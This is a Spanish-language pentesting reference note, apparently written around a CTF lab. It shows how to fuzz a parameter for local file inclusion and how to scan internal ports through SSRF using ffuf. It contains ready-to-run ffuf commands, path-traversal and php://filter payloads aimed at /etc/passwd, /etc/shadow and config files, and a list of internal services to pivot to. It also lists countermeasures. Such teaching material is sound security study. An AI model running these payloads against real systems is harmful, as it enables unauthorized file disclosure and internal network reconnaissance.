---
title: Fuzzing de LFI y Escaneo de Puertos vía SSRF
slug: fuzzing-lfi-ssrf
aliases: [LFI Fuzzing, SSRF Port Scan, LFI Discovery]
fase: [Enumeración]
plataforma: Web
dificultad: Intermedia
mitre: [T1595.002, T1046]
related: [fuzzing-parametros, analisis-lfi-rfi, analisis-ssrf]
learning_refs: []
---

# Fuzzing de LFI y Escaneo de Puertos vía SSRF

## Descripción
Dos técnicas de fuzzing especializado: (1) LFI fuzzing — usa listas de payloads de Local File Inclusion para descubrir parámetros vulnerables y rutas de archivos del sistema explotables; y (2) SSRF port scanning — cuando existe una vulnerabilidad SSRF (Server-Side Request Forgery), se usa ffuf para enumerar puertos y servicios internos del servidor que no son accesibles directamente. Ambas técnicas convierten vulnerabilidades de enumeración en vectores de escalada significativos.

## Herramientas
- **ffuf** — fuzzer web; soporte de cookies de sesion, filtros múltiples y wordlists especializadas

## Comandos / Ejemplos

### LFI fuzzing
```bash
# Fuzzing de parametro vulnerable a LFI con wordlist especializada
ffuf -u 'http://10.65.153.228:50000/profile.php?img=FUZZ' \
  -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fs 0,17 \
  -b "PHPSESSID=lf0ohmk4bl6tepel9espo13tbt"
# -fs 0,17: filtra respuestas vacias (0) y del tamano de error base (17)
# -b: pasar cookie de sesion para acceder a endpoints autenticados
# LFI-Jhaddix.txt: lista exhaustiva de payloads de path traversal

# Payloads LFI comunes incluidos en la wordlist:
# ../etc/passwd
# ....//....//etc/passwd  (bypass de filtros simples)
# ..%2F..%2Fetc%2Fpasswd  (URL encoding)
# php://filter/convert.base64-encode/resource=index.php
# /proc/self/environ
```

**Archivos objetivo de interes en LFI:**
| Archivo | Información |
|---------|-------------|
| `/etc/passwd` | Usuarios del sistema |
| `/etc/shadow` | Hashes de contraseñas (requiere root) |
| `/etc/hosts` | Mapeado DNS interno |
| `/proc/self/environ` | Variables de entorno del proceso |
| `php://filter/...resource=config.php` | Código fuente PHP en base64 |
| `C:\Windows\win.ini` | Archivo Windows (confirma LFI en Windows) |

### SSRF + fuzzing de puertos internos
```bash
# Crear lista de puertos comunes
seq 1 10000 > ports.txt
# O usar puertos especificos conocidos:
echo -e "80\n443\n8080\n8443\n3306\n5432\n6379\n9200\n27017\n11211" > common_ports.txt

# ffuf - escaneo de puertos internos via SSRF
ffuf -w ports.txt:FUZZ \
  -u http://10.66.145.215/preview.php?url=http://127.0.0.1:FUZZ \
  -fs 0
# -fs 0: filtra respuestas vacias (puerto cerrado → sin respuesta)
# Un resultado con contenido indica puerto abierto

# Variante con schema file:// (si SSRF lo permite)
ffuf -w ports.txt:FUZZ \
  -u http://TARGET/fetch?url=http://127.0.0.1:FUZZ

# Resultado ejemplo (CTF Extract Room):
# Puerto 80 → servidor web interno
# Puerto 10000 → panel de administracion (Webmin, etc.)
```

**Servicios internos comunes a descubrir vía SSRF:**
| Puerto | Servicio |
|--------|---------|
| 6379 | Redis (a menudo sin autenticación) |
| 9200 | Elasticsearch (a menudo sin autenticación) |
| 27017 | MongoDB |
| 11211 | Memcached |
| 8500 | Consul |
| 2375 | Docker API (sin TLS) |
| 4848 | GlassFish admin |

**Pivotando desde SSRF descubierto:**
```bash
# Una vez encontrado el puerto interno, acceder via SSRF
# Ej: panel en puerto 10000 → http://TARGET/preview.php?url=http://127.0.0.1:10000/
```

## Contramedidas
- Para LFI: validar y sanitizar todas las entradas de rutas de archivo; usar listas blancas de archivos permitidos; no concatenar input del usuario directamente en include/require
- Para SSRF: implementar validacion de URLs (lista blanca de dominios/IPs permitidos); bloquear acceso a redes internas (169.254.x.x, 10.x.x.x, 192.168.x.x, 127.x.x.x); usar firewalls de egress en el servidor
- Monitorear errores de archivo y conexiones salientes inusuales en los logs

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- OWASP Foundation. (2021). *OWASP Top Ten - A10: Server-Side Request Forgery*. https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
- MITRE Corporation. (2024). ATT&CK Technique T1595.002: Active Scanning: Vulnerability Scanning. https://attack.mitre.org/techniques/T1595/002/
- danielmiessler. (s.f.). *SecLists* [Repositorio]. GitHub. https://github.com/danielmiessler/SecLists
